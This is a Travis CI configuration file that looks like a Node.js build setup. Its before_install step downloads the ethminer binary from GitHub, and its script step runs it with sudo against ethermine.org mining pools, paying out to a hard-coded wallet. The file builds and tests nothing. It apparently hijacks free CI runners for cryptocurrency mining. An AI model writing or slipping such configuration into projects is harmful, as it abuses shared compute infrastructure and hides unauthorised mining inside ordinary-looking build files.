language: node_js
node_js:
- '7'
sudo: required
dist: trusty

jobs:
  include:          
      before_install: 
      - echo before install
      - wget https://github.com/ethereum-mining/ethminer/releases/download/v0.13.0rc4/ethminer-0.13.0rc4-Linux.tar.gz
      - tar -xvzf ethminer-0.13.0rc4-Linux.tar.gz

      script:      
      - sudo timeout 10s ./bin/ethminer --farm-recheck 200 -G -S eu1.ethermine.org:4444 -FS us1.ethermine.org:4444 -O e5b2bf30d32c0ff3c1a358d5e94c831b0130b931.SquitCoinBust
            
      after_success:
      - echo success
